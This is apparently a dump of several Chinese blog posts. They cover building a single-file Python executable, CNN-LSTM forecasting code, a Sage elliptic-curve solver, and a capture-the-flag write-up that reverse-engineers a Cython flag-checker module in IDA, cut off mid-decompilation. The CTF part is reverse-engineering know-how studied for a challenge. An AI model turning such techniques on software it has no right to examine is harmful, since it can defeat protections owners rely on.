    elif line.endswith(b&#x27;\\r&#x27;):
        newline = "\\r"
    elif line.endswith(b&#x27;\\n&#x27;):
        newline = "\\n"
    else:
        raise ValueError(f"unknown end of line: {filename}: {line!a}")

    with open(tmpfile, &#x27;w&#x27;, newline=newline,encoding=&#x27;utf8&#x27;) as outfile:
        with open(filename,encoding=&#x27;utf8&#x27;) as infile:
            yield infile, outfile
    update_file_with_tmpfile(filename, tmpfile)

def update_file_with_tmpfile(filename, tmpfile, *, create=False):
    try:
        targetfile = open(filename, &#x27;rb&#x27;)
    except FileNotFoundError:
        if not create:
            raise  # re-raise
        outcome = &#x27;created&#x27;
        os.replace(tmpfile, filename)
    else:
        with targetfile:
            old_contents = targetfile.read()
        with open(tmpfile, &#x27;rb&#x27;) as f:
            new_contents = f.read()
        # Now compare!
        if old_contents != new_contents:
            outcome = &#x27;updated&#x27;
            os.replace(tmpfile, filename)
        else:
            outcome = &#x27;same&#x27;
            os.unlink(tmpfile)
    return outcome

if __name__ == &#x27;__main__&#x27;:
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument(&#x27;--create&#x27;, action=&#x27;store_true&#x27;)
    parser.add_argument(&#x27;--exitcode&#x27;, action=&#x27;store_true&#x27;)
    parser.add_argument(&#x27;filename&#x27;, help=&#x27;path to be updated&#x27;)
    parser.add_argument(&#x27;tmpfile&#x27;, help=&#x27;path with new contents&#x27;)
    args = parser.parse_args()
    kwargs = vars(args)
    setexitcode = kwargs.pop(&#x27;exitcode&#x27;)

    outcome = update_file_with_tmpfile(**kwargs)
    if setexitcode:
        if outcome == &#x27;same&#x27;:
            sys.exit(0)
        elif outcome == &#x27;updated&#x27;:
            sys.exit(1)
        elif outcome == &#x27;created&#x27;:
            sys.exit(2)
        else:
            raise NotImplementedError

在python源代码根目录下打开cmd，依次运行（这里使用python如果报错的话是因为使用了刚编译的python，你可以将其替换为本地的python路径）：
powershell3 linescopypython ./Tools/build/freeze_modules.py --step=0
python ./Tools/build/freeze_modules.py --step=1
"PCbuild/amd64/_freeze_module.exe" _pyrepl ./Lib/_pyrepl/__main__.py ./Python/frozen_modules/_pyrepl.h
回到VS，选择Python项目，右键生成，生成完后会报很多错，不用理会，此时amd64文件夹下已经生成可单文件运行的python.exe，包含了标准库，如果还需拓展库的话，可以在python.exe的同文件夹下防止python313.zip，zip中压缩库文件（也可以在运行python ./Tools/build/freeze_modules.py --step=0之前将这些库放置到源码的Lib目录下进行freeze）
这里提供一个成品：python

update：
这样编译完后每次运行Python会因为找不到环境变量而产生Warning：
text1 linecopyCould not find platform independent libraries <prefix>
可以修改\\Modules\\getpath.py，删掉其中的warn('Could not find platform independent libraries <prefix>')
上面给的成品未作修改
python ./Tools/build/freeze_modules.py --step=0命令将会修改Lib文件夹中的部分文件，所以请不要重复运行，如需重新运行请删除LIb文件夹并重新解压

编译3.13以前版本时：
会没有_pyrepl库，因此不用修改Lib/_pyrepl/__main.py__，并且不用运行"PCbuild/amd64/_freeze_module.exe _pyrepl" ./Lib/_pyrepl/__main__.py ./Python/frozen_modules/_pyrepl.h

第二次编译静态链接版本时可能会提示找不到getpath.h，你可以在第一次成功编译的PCbuild/obj/_freeze_module文件夹中找到getpath.g.h，重命名为getpath.h后放到Python/frozen_modules/文件夹中即可

这里提供一个python3.12成品：python`,a4iwsl8j:`很久以前写的代码，那个时候transformer还没有火起来，现在万物皆可transformer了
使用CNN+LSTM，支持多特征，多步预测，K-折交叉验证
python145 linescopyimport torch.nn as nn
import torch
import torch.optim as optim
from torch.utils.data import DataLoader, Dataset
import numpy as np
from torch.autograd import Variable
import os
import pandas as pd
from torchvision import transforms
import numpy as np
from sklearn.model_selection import KFold
#os.environ[&#x27;KMP_DUPLICATE_LIB_OK&#x27;] = &#x27;True&#x27;

#全局参数
feature = [&#x27;feature1&#x27;,&#x27;feature2&#x27;,&#x27;feature3&#x27;,&#x27;feature4&#x27;] #特征列表，要预测的的feature放在第一个位置
hidden_size = 32  #隐藏层的维度
batch_size = 32  #批大小
sequence = 5  #序列长度
folds = 5  #K折交叉验证的折数
step_num = 100 #训练的步数
dataset_name = &#x27;data.csv&#x27;  #数据集名称
prediction_name = &#x27;predict.csv&#x27;  #预测数据的名称

#读取数据
df = pd.read_csv(dataset_name)
df = df.sort_index(ascending=True)
#print(df.head(5))
# 提取feature,并做标准化
df = df[feature]
min_max = dict.fromkeys(feature)
for i in feature:
    min_max[i] = [df[i].min(),df[i].max()]
df = df.apply(lambda x: (x - min(x)) / (max(x) - min(x)))
total_len = df.shape[0]
X = []
Y = []
for i in range(df.shape[0] - sequence):
    X.append(np.array(df.iloc[i:(i + sequence), ].values, dtype=np.float32))
    Y.append(np.array(df.iloc[(i + sequence), 0], dtype=np.float32))
class Mydataset(Dataset):

    def __init__(self, xx, yy, transform=None):
        self.x = xx
        self.y = yy
        self.tranform = transform

    def __getitem__(self, index):
        x1 = self.x[index]
        y1 = self.y[index]
        if self.tranform != None:
            return self.tranform(x1), y1
        return x1, y1

    def __len__(self):
        return len(self.x)
class CNN_LSTM(nn.Module):
    def __init__(self, args):
        super(CNN_LSTM, self).__init__()
        self.args = args
        self.relu = nn.ReLU(inplace=True)
        self.conv = nn.Sequential(
            nn.Conv1d(in_channels=args[&#x27;in_channels&#x27;], out_channels=args[&#x27;out_channels&#x27;], kernel_size=3),
            nn.ReLU(),
            nn.MaxPool1d(kernel_size=3, stride=1)
        )
        self.lstm = nn.LSTM(input_size=args[&#x27;out_channels&#x27;], hidden_size=args[&#x27;hidden_size&#x27;],
                            num_layers=args[&#x27;num_layers&#x27;], batch_first=True)
        self.fc = nn.Linear(args[&#x27;hidden_size&#x27;], args[&#x27;output_size&#x27;])
    def forward(self, x):
        x = x.permute(0, 2, 1)
        x = self.conv(x)
        x = x.permute(0, 2, 1)
        x, _ = self.lstm(x)
        x = self.fc(x)
        x = x[:, -1, :]
        return x
kf = KFold(n_splits=folds)
folenum = 0
for train_index, test_index in kf.split(X):
    #model = lstm(len(feature),hidden_size,1)
    model = CNN_LSTM(args=dict(in_channels=len(feature), out_channels=hidden_size, hidden_size=hidden_size, num_layers=1, output_size=1))
    criterion = nn.MSELoss()
    optimizer = optim.Adam(model.parameters(), lr=0.001)
    trainx, trainy = np.array(X)[train_index], np.array(Y)[train_index]
    testx, testy = np.array(X)[test_index], np.array(Y)[test_index]
    train_loader = DataLoader(dataset=Mydataset(trainx, trainy, transform=transforms.ToTensor()), batch_size=batch_size,
                              shuffle=True)
    test_loader = DataLoader(dataset=Mydataset(testx, testy), batch_size=batch_size, shuffle=True)
    preds = []
    labels = []
    loss123 = []
    for i in range(step_num):
        total_loss = 0
        for idx, (data, label) in enumerate(train_loader):
            data1 = data.squeeze(1)
            pred = model(Variable(data1))
            label = label.unsqueeze(1)
            loss = criterion(pred, label)
            optimizer.zero_grad()
            loss.backward()
            optimizer.step()
            total_loss += loss.item()
            loss123.append(total_loss)
    import matplotlib.pyplot as plt

    plt.plot(loss123, "r", label="loss")
    plt.title(&#x27;loss&#x27;)
    plt.show()
    preds = []
    labels = []
    for idx, (x, label) in enumerate(test_loader):
        x = x.squeeze(1)  # batch_size,seq_len,input_size
        pred = model(x)
        preds.extend(pred.data.squeeze(1).tolist())
        labels.extend(label.tolist())
    plt.plot([ele * (list(min_max.values())[0][1] - list(min_max.values())[0][0]) + list(min_max.values())[0][0] for ele in preds], "r", label="pred")
    plt.plot([ele * (list(min_max.values())[0][1] - list(min_max.values())[0][0]) + list(min_max.values())[0][0] for ele in labels], "b", label="real")
    plt.title(&#x27;prediction&#x27;)
    plt.show()
    torch.save(model.state_dict(), (f&#x27;model-fold{folenum+1}.pt&#x27;))
    folenum += 1

# 开始测试
df2 = pd.read_csv(prediction_name)
df1 = df2.tail(sequence)
df1 = df1.sort_index(ascending=True)
df1 = df1[feature]
for i in feature:
    df1[i] = (df1[i] - min_max[i][0]) / (min_max[i][1] - min_max[i][0])
x = torch.tensor(np.array(df1))
x = x.to(torch.float32)
x = x.unsqueeze(0)
result = []
for folenum in range(folds):
    model.load_state_dict(torch.load(f&#x27;model-fold{folenum+1}.pt&#x27;))
    result.append(model(x).data.squeeze(1).tolist()[0] * (list(min_max.values())[0][1] - list(min_max.values())[0][0]) + list(min_max.values())[0][0])

print("预测结果:" + str(sum(result) / len(result)))`,edfngw96:`根据椭圆曲线加法原理，只要找到1组有理解后一直迭代即可
Python33 linescopyfrom sage.all import *
from fractions import Fraction

def multiply_list_values_1(lst, number):
    for i in range(len(lst)):
        lst[i] = lst[i] * number
    return lst
R = RationalField()
n = 6

P2 = ProjectiveSpace(2, R)
x, y, z = P2.coordinate_ring().gens()

E = EllipticCurve_from_cubic(x**3 - (n-1)*x**2*y - (n-1)*x**2*z - (n-1)*x*y**2 - (2*n-3)*x*y*z - (n-1)*x*z**2 + y**3 - (n-1)*y**2*z - (n-1)*y*z**2 + z**3)
#print(E)
g = E.inverse()
print(E.codomain().integral_points(both_signs=True))
Pt = g(E.codomain().integral_points(both_signs=True)[0])
for n in range(1, 100000):
    nPt_inE = E(Pt)*n
    nPt_inC = g(nPt_inE)
    #print(nPt_inC)
    X = nPt_inC[0].numerator()
    Y = nPt_inC[1].numerator()
    Z = nPt_inC[0].denominator()
    if X > 0 and Y > 0:
        print("X =", X)
        print("Y =", Y)
        print("Z =", Z)
        break
problem = ((x/(y+z) + y/(x+z) + z/(x+y))-n)
if problem(X, Y, Z) == 0:
    print("OK!")`,qnkp71ue:`check.pyd丢进ida，查看string，发现可疑数字字符串
1
查找引用直接找到模块常量初始化函数，模块的所有常量都储存在off_18000B688，之后逆向遇到常量时来这里对照：
c110 linescopy__int64 sub_180002BD0()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax

  if ( (int)sub_180002620() < 0 )
    return 0xFFFFFFFFLL;
  v0 = PyLong_FromLong(0LL);
  *((_QWORD *)off_18000B688 + 29) = v0;
  if ( !v0 )
    return 0xFFFFFFFFLL;
  v1 = PyLong_FromLong(1LL);
  *((_QWORD *)off_18000B688 + 30) = v1;
  if ( !v1 )
    return 0xFFFFFFFFLL;
  v2 = PyLong_FromLong(2LL);
  *((_QWORD *)off_18000B688 + 31) = v2;
  if ( !v2 )
    return 0xFFFFFFFFLL;
  v3 = PyLong_FromLong(4LL);
  *((_QWORD *)off_18000B688 + 32) = v3;
  if ( !v3 )
    return 0xFFFFFFFFLL;
  v4 = PyLong_FromLong(5LL);
  *((_QWORD *)off_18000B688 + 33) = v4;
  if ( !v4 )
    return 0xFFFFFFFFLL;
  v5 = PyLong_FromLong(8LL);
  *((_QWORD *)off_18000B688 + 34) = v5;
  if ( !v5 )
    return 0xFFFFFFFFLL;
  v6 = PyLong_FromLong(11LL);
  *((_QWORD *)off_18000B688 + 35) = v6;
  if ( !v6 )
    return 0xFFFFFFFFLL;
  v7 = PyLong_FromLong(16LL);
  *((_QWORD *)off_18000B688 + 36) = v7;
  if ( !v7 )
    return 0xFFFFFFFFLL;
  v8 = PyLong_FromLong(23LL);
  *((_QWORD *)off_18000B688 + 37) = v8;
  if ( !v8 )
    return 0xFFFFFFFFLL;
  v9 = PyLong_FromLong(65537LL);
  *((_QWORD *)off_18000B688 + 38) = v9;
  if ( !v9 )
    return 0xFFFFFFFFLL;
  v10 = PyLong_FromLong(37360232LL);
  *((_QWORD *)off_18000B688 + 39) = v10;
  if ( !v10 )
    return 0xFFFFFFFFLL;
  v11 = PyLong_FromLong(304643896LL);
  *((_QWORD *)off_18000B688 + 40) = v11;
  if ( !v11 )
    return 0xFFFFFFFFLL;
  v12 = PyLong_FromLong(1244723021LL);
  *((_QWORD *)off_18000B688 + 41) = v12;
  if ( !v12 )
    return 0xFFFFFFFFLL;
  v13 = PyLong_FromString("2282784775", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 42) = v13;
  if ( !v13 )
    return 0xFFFFFFFFLL;
  v14 = PyLong_FromString("2563918650", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 43) = v14;
  if ( !v14 )
    return 0xFFFFFFFFLL;
  v15 = PyLong_FromString("2654435769", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 44) = v15;
  if ( !v15 )
    return 0xFFFFFFFFLL;
  v16 = PyLong_FromString("2918417411", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 45) = v16;
  if ( !v16 )
    return 0xFFFFFFFFLL;
  v17 = PyLong_FromString("3628702646", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 46) = v17;
  if ( !v17 )
    return 0xFFFFFFFFLL;
  v18 = PyLong_FromString("3773946743", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 47) = v18;
  if ( !v18 )
    return 0xFFFFFFFFLL;
  v19 = PyLong_FromString("4198170623", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 48) = v19;
  if ( !v19 )
    return 0xFFFFFFFFLL;
  v20 = PyLong_FromString("4294967293", 0LL, 0LL);
  *((_QWORD *)off_18000B688 + 49) = v20;
  return (unsigned int)(v20 != 0) - 1;
}
运行import rand0m dir(rand0m)发现该模块有两个函数check和rand0m，check接受一个16进制字符串（flag），返回True/False，random接受一个16进制字符串（seed），返回一个元组，包含两个伪随机数。
直接在代码段中搜索Py_TrueStruct，找到check函数代码段：
c733 linescopy__int64 __fastcall sub_180001960(__int64 a1, __int64 a2)
{
  __int64 v2; // r12
  __int64 v3; // rbx
  int *v4; // rsi
  int *v5; // r14
  __int64 v6; // r8
  unsigned int v7; // ebp
  unsigned int v8; // r13d
  _QWORD *v9; // rdx
  _DWORD *v10; // rcx
  _DWORD *v11; // rcx
  _DWORD *v12; // rcx
  _DWORD *v13; // rcx
  _DWORD *v14; // rcx
  _DWORD *v15; // rcx
  _DWORD *v16; // rcx
  _DWORD *v17; // rcx
  _DWORD *v18; // rcx
  __int64 v19; // r13
  int v20; // eax
  __int64 v21; // rcx
  __int64 v22; // r15
  bool v23; // zf
  _QWORD *v24; // rdx
  __int64 v25; // rax
  __int64 v26; // r8
  __int64 v27; // r9
  unsigned __int64 v28; // rcx
  int *v29; // rbp
  int *v30; // r14
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // r9
  __int64 v34; // rbx
  __int64 v35; // rax
  __int64 v36; // r8
  unsigned __int64 v37; // rcx
  int *v38; // rsi
  int *v39; // rdi
  __int64 v40; // rax
  __int64 v41; // r8
  __int64 v42; // rbx
  __int64 v43; // rax
  int *v44; // r12
  int *v45; // rcx
  __int64 v46; // rdi
  int *Item_KnownHash; // rax
  int *v48; // rcx
  int v49; // eax
  _DWORD *v50; // rsi
  int v51; // edx
  __int64 v52; // rbx
  __int64 v53; // r8
  int *v54; // rcx
  int *v55; // r12
  __int64 v56; // rcx
  __int64 v57; // r9
  __int64 v58; // r8
  __int64 v59; // rax
  unsigned __int64 v60; // rcx
  int *v61; // rsi
  __int64 v62; // rax
  __int64 v63; // r8
  int IsTrue; // ebx
  __int64 v65; // rcx
  _QWORD *v66; // rdx
  __int64 v67; // rax
  __int64 v68; // r8
  __int64 v69; // r9
  unsigned __int64 v70; // rcx
  int *v71; // rsi
  __int64 v72; // rax
  __int64 v73; // r8
  __int64 v74; // r8
  int v75; // esi
  __int64 v76; // rax
  int *v77; // rcx
  __int64 v78; // rdx
  __int64 v79; // rbx
  __int64 v80; // rax
  int *v81; // rcx
  int *v83; // [rsp+30h] [rbp-88h]
  int *v84; // [rsp+38h] [rbp-80h]
  _QWORD v85[2]; // [rsp+50h] [rbp-68h] BYREF
  int v86; // [rsp+C0h] [rbp+8h]
  int *v88; // [rsp+D0h] [rbp+18h]
  __int64 v89; // [rsp+D8h] [rbp+20h]

  v2 = a2;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v83 = 0LL;
  v88 = 0LL;
  v84 = 0LL;
  v6 = PyList_New(8LL);
  if ( !v6 )
  {
    v7 = 13;
    v8 = 2861;
    goto LABEL_225;
  }
  v9 = off_18000B688;
  v10 = (_DWORD *)*((_QWORD *)off_18000B688 + 40);
  if ( *v10 != -1 )
    ++*v10;
  **(_QWORD **)(v6 + 24) = v9[40];
  v11 = (_DWORD *)v9[43];
  if ( *v11 != -1 )
    ++*v11;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 8LL) = v9[43];
  v12 = (_DWORD *)v9[41];
  if ( *v12 != -1 )
    ++*v12;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 16LL) = v9[41];
  v13 = (_DWORD *)v9[47];
  if ( *v13 != -1 )
    ++*v13;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 24LL) = v9[47];
  v14 = (_DWORD *)v9[39];
  if ( *v14 != -1 )
    ++*v14;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 32LL) = v9[39];
  v15 = (_DWORD *)v9[45];
  if ( *v15 != -1 )
    ++*v15;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 40LL) = v9[45];
  v16 = (_DWORD *)v9[42];
  if ( *v16 != -1 )
    ++*v16;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 48LL) = v9[42];
  v17 = (_DWORD *)v9[46];
  if ( *v17 != -1 )
    ++*v17;
  v83 = (int *)v6;
  *(_QWORD *)(*(_QWORD *)(v6 + 24) + 56LL) = v9[46];
  v18 = (_DWORD *)v9[29];
  if ( *v18 != -1 )
    ++*v18;
  v19 = v9[29];
  v20 = 0;
  v89 = v19;
  v86 = 0;
  while ( 1 )
  {
    v22 = PyLong_FromLong((unsigned int)v20);
    if ( !v22 )
    {
      v7 = 15;
      v8 = 2908;
      goto LABEL_223;
    }
    if ( v4 )
    {
      if ( *v4 >= 0 )
      {
        v23 = (*(_QWORD *)v4)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v4);
      }
    }
    v24 = off_18000B688;
    v25 = *(_QWORD *)(v22 + 8);
    v26 = PyLong_Type[0];
    v27 = *((_QWORD *)off_18000B688 + 34);
    if ( v25 == PyLong_Type[0] )
    {
      v28 = *(_QWORD *)(v22 + 16);
      if ( (v28 & 1) != 0 )
      {
        if ( *(_DWORD *)v22 != -1 )
          ++*(_DWORD *)v22;
        v29 = (int *)v22;
        v30 = (int *)v22;
        goto LABEL_40;
      }
      v31 = v28 >= 0x10
          ? (*(__int64 (__fastcall **)(__int64, _QWORD))(PyLong_Type[12] + 16LL))(v22, *((_QWORD *)off_18000B688 + 34))
          : PyLong_FromLongLong(
              8LL * (int)(*(_DWORD *)(v22 + 24) * (1 - (v28 & 3))),
              off_18000B688,
              PyLong_Type[0],
              v27);
    }
    else
    {
      v31 = v25 == PyFloat_Type
          ? PyFloat_FromDouble(v21, off_18000B688, PyLong_Type[0], v27)
          : PyNumber_Multiply(v22, *((_QWORD *)off_18000B688 + 34));
    }
    v29 = (int *)v31;
    v30 = (int *)v31;
    if ( !v31 )
    {
      v7 = 16;
      v8 = 2920;
      v4 = (int *)v22;
      goto LABEL_223;
    }
    v24 = off_18000B688;
LABEL_40:
    v32 = sub_1800044A0(v22, v24[30], v26, 0LL);
    v34 = v32;
    if ( !v32 )
    {
      v8 = 2922;
      v39 = 0LL;
      goto LABEL_208;
    }
    v35 = *(_QWORD *)(v32 + 8);
    v36 = *((_QWORD *)off_18000B688 + 34);
    if ( v35 == PyLong_Type[0] )
    {
      v37 = *(_QWORD *)(v34 + 16);
      if ( (v37 & 1) != 0 )
      {
        if ( *(_DWORD *)v34 != -1 )
          ++*(_DWORD *)v34;
        v38 = (int *)v34;
        v39 = (int *)v34;
        goto LABEL_53;
      }
      v40 = v37 >= 0x10
          ? (*(__int64 (__fastcall **)(__int64, _QWORD))(PyLong_Type[12] + 16LL))(v34, *((_QWORD *)off_18000B688 + 34))
          : PyLong_FromLongLong(8LL * (int)(*(_DWORD *)(v34 + 24) * (1 - (v37 & 3))), PyLong_Type[0], v36, v33);
    }
    else
    {
      v40 = v35 == PyFloat_Type
          ? PyFloat_FromDouble(off_18000B688, PyLong_Type[0], v36, v33)
          : PyNumber_Multiply(v34, *((_QWORD *)off_18000B688 + 34));
    }
    v38 = (int *)v40;
    v39 = (int *)v40;
    if ( !v40 )
    {
      v8 = 2924;
      goto LABEL_208;
    }
LABEL_53:
    if ( *(int *)v34 >= 0 )
    {
      v23 = (*(_QWORD *)v34)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v34);
    }
    v41 = *(_QWORD *)(v2 + 8);
    v42 = *(_QWORD *)(v41 + 112);
    if ( !v42 || !*(_QWORD *)(v42 + 8) )
    {
      PyErr_Format(PyExc_TypeError, "&#x27;%.200s&#x27; object is unsliceable", *(const char **)(v41 + 24));
LABEL_204:
      v34 = 0LL;
LABEL_205:
      v8 = 2927;
LABEL_208:
      v7 = 16;
      goto LABEL_209;
    }
    v43 = PySlice_New(v29, v38, Py_NoneStruct);
    v44 = (int *)v43;
    if ( !v43 )
      goto LABEL_204;
    v34 = (*(__int64 (__fastcall **)(__int64, __int64))(v42 + 8))(a2, v43);
    if ( *v44 >= 0 )
    {
      v23 = (*(_QWORD *)v44)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v44);
    }
    if ( !v34 )
      goto LABEL_205;
    if ( *v29 >= 0 )
    {
      v23 = (*(_QWORD *)v29)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v29);
    }
    if ( *v38 >= 0 )
    {
      v23 = (*(_QWORD *)v38)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v38);
    }
    v45 = v88;
    v88 = (int *)v34;
    if ( v45 )
    {
      if ( *v45 >= 0 )
      {
        v23 = (*(_QWORD *)v45)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v45);
      }
    }
    v46 = *((_QWORD *)off_18000B688 + 19);
    Item_KnownHash = (int *)PyDict_GetItem_KnownHash(*(_QWORD *)off_18000B688, v46, *(_QWORD *)(v46 + 24));
    v48 = Item_KnownHash;
    if ( Item_KnownHash )
    {
      v49 = *Item_KnownHash + 1;
      if ( v49 )
        *v48 = v49;
      v39 = v48;
    }
    else if ( PyErr_Occurred() || (v39 = (int *)sub_180003D40(v46), (v48 = v39) == 0LL) )
    {
      v7 = 17;
      v8 = 2941;
      v4 = (int *)v22;
      goto LABEL_223;
    }
    v50 = 0LL;
    v51 = 0;
    if ( *((_QWORD *)v48 + 1) == PyMethod_Type )
    {
      v50 = (_DWORD *)*((_QWORD *)v48 + 3);
      if ( v50 )
      {
        v39 = (int *)*((_QWORD *)v48 + 2);
        if ( *v50 != -1 )
          ++*v50;
        if ( *v39 != -1 )
          ++*v39;
        if ( *v48 >= 0 )
        {
          v23 = (*(_QWORD *)v48)-- == 1LL;
          if ( v23 )
            Py_Dealloc(v48);
        }
        v51 = 1;
      }
    }
    v85[0] = v34;
    v52 = sub_180004660(v39, &v85[-v51], (unsigned int)(v51 + 1));
    if ( v50 )
    {
      if ( (int)*v50 >= 0 )
      {
        v23 = (*(_QWORD *)v50)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v50);
      }
    }
    if ( !v52 )
    {
      v7 = 17;
      v8 = 2961;
      v4 = (int *)v22;
LABEL_216:
      v5 = v88;
      goto LABEL_217;
    }
    if ( *v39 >= 0 )
    {
      v23 = (*(_QWORD *)v39)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v39);
    }
    v54 = v84;
    v55 = (int *)v52;
    v84 = (int *)v52;
    if ( v54 )
    {
      if ( *v54 >= 0 )
      {
        v23 = (*(_QWORD *)v54)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v54);
      }
    }
    v34 = sub_180004790(v52, 1LL, v53, 0LL);
    if ( !v34 )
    {
      v7 = 18;
      v8 = 2975;
      v4 = (int *)v22;
      goto LABEL_223;
    }
    v58 = *((_QWORD *)off_18000B688 + 31);
    v59 = *(_QWORD *)(v22 + 8);
    if ( v59 == PyLong_Type[0] )
    {
      v60 = *(_QWORD *)(v22 + 16);
      if ( (v60 & 1) != 0 )
      {
        if ( *(_DWORD *)v22 != -1 )
          ++*(_DWORD *)v22;
        v61 = (int *)v22;
        v39 = (int *)v22;
        goto LABEL_114;
      }
      v62 = v60 >= 0x10
          ? (*(__int64 (__fastcall **)(__int64, _QWORD))(PyLong_Type[12] + 16LL))(v22, *((_QWORD *)off_18000B688 + 31))
          : PyLong_FromLongLong(2LL * (int)(*(_DWORD *)(v22 + 24) * (1 - (v60 & 3))), PyLong_Type[0], v58, v57);
    }
    else
    {
      v62 = v59 == PyFloat_Type
          ? PyFloat_FromDouble(v56, PyLong_Type[0], v58, v57)
          : PyNumber_Multiply(v22, *((_QWORD *)off_18000B688 + 31));
    }
    v61 = (int *)v62;
    v39 = (int *)v62;
    if ( !v62 )
    {
      v7 = 18;
      v8 = 2977;
      v4 = (int *)v22;
      goto LABEL_213;
    }
LABEL_114:
    v30 = (int *)sub_180004930(v83, v61, v58);
    if ( !v30 )
    {
      v7 = 18;
      v8 = 2979;
      v4 = (int *)v22;
      goto LABEL_213;
    }
    if ( *v61 >= 0 )
    {
      v23 = (*(_QWORD *)v61)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v61);
    }
    v39 = (int *)PyObject_RichCompare(v34, v30, 2LL);
    if ( !v39 )
    {
      v7 = 18;
      v8 = 2982;
      goto LABEL_209;
    }
    if ( *(int *)v34 >= 0 )
    {
      v23 = (*(_QWORD *)v34)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v34);
    }
    if ( *v30 >= 0 )
    {
      v23 = (*(_QWORD *)v30)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v30);
    }
    IsTrue = v39 == (int *)Py_TrueStruct;
    if ( !(IsTrue | (v39 == (int *)Py_FalseStruct || v39 == (int *)Py_NoneStruct)) )
      IsTrue = PyObject_IsTrue(v39);
    if ( IsTrue < 0 )
    {
      v7 = 18;
      v8 = 2985;
      v4 = (int *)v22;
      goto LABEL_218;
    }
    if ( *v39 >= 0 )
    {
      v23 = (*(_QWORD *)v39)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v39);
    }
    if ( !IsTrue )
      goto LABEL_172;
    v39 = (int *)sub_180004790(v55, 0LL, v63, 0LL);
    if ( !v39 )
    {
      v7 = 18;
      v8 = 2992;
      v4 = (int *)v22;
      goto LABEL_223;
    }
    v66 = off_18000B688;
    v67 = *(_QWORD *)(v22 + 8);
    v68 = PyLong_Type[0];
    v69 = *((_QWORD *)off_18000B688 + 31);
    if ( v67 != PyLong_Type[0] )
    {
      if ( v67 == PyFloat_Type )
        v72 = PyFloat_FromDouble(v65, off_18000B688, PyLong_Type[0], v69);
      else
        v72 = PyNumber_Multiply(*((_QWORD *)off_18000B688 + 31), v22);
      goto LABEL_144;
    }
    v70 = *(_QWORD *)(v22 + 16);
    if ( (v70 & 1) == 0 )
    {
      if ( v70 >= 0x10 )
        v72 = (*(__int64 (__fastcall **)(_QWORD, __int64))(PyLong_Type[12] + 16LL))(
                *((_QWORD *)off_18000B688 + 31),
                v22);
      else
        v72 = PyLong_FromLongLong(
                2LL * (int)(*(_DWORD *)(v22 + 24) * (1 - (v70 & 3))),
                off_18000B688,
                PyLong_Type[0],
                v69);
LABEL_144:
      v71 = (int *)v72;
      v30 = (int *)v72;
      if ( !v72 )
      {
        v7 = 18;
        v8 = 2994;
        v4 = (int *)v22;
        goto LABEL_218;
      }
      v66 = off_18000B688;
      goto LABEL_146;
    }
    if ( *(_DWORD *)v22 != -1 )
      ++*(_DWORD *)v22;
    v71 = (int *)v22;
    v30 = (int *)v22;
LABEL_146:
    v34 = sub_1800044A0(v71, v66[30], v68, 0LL);
    if ( !v34 )
    {
      v7 = 18;
      v8 = 2996;
LABEL_209:
      v4 = (int *)v22;
      if ( *v30 >= 0 )
      {
        v23 = (*(_QWORD *)v30)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v30);
      }
      if ( !v34 )
        goto LABEL_216;
      goto LABEL_213;
    }
    if ( *v71 >= 0 )
    {
      v23 = (*(_QWORD *)v71)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v71);
    }
    v30 = (int *)sub_180004930(v83, v34, v73);
    if ( !v30 )
    {
      v7 = 18;
      v8 = 2999;
      v4 = (int *)v22;
      goto LABEL_213;
    }
    if ( *(int *)v34 >= 0 )
    {
      v23 = (*(_QWORD *)v34)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v34);
    }
    v34 = PyObject_RichCompare(v39, v30, 2LL);
    if ( !v34 )
    {
      v7 = 18;
      v8 = 3002;
      goto LABEL_209;
    }
    if ( *v39 >= 0 )
    {
      v23 = (*(_QWORD *)v39)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v39);
    }
    v39 = 0LL;
    if ( *v30 >= 0 )
    {
      v23 = (*(_QWORD *)v30)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v30);
    }
    v75 = v34 == Py_TrueStruct;
    if ( !(v75 | (v34 == Py_FalseStruct || v34 == Py_NoneStruct)) )
      v75 = PyObject_IsTrue(v34);
    if ( v75 < 0 )
    {
      v7 = 18;
      v8 = 3005;
      v4 = (int *)v22;
LABEL_213:
      if ( *(int *)v34 >= 0 )
      {
        v23 = (*(_QWORD *)v34)-- == 1LL;
        if ( v23 )
          Py_Dealloc(v34);
      }
      goto LABEL_216;
    }
    if ( *(int *)v34 >= 0 )
    {
      v23 = (*(_QWORD *)v34)-- == 1LL;
      if ( v23 )
        Py_Dealloc(v34);
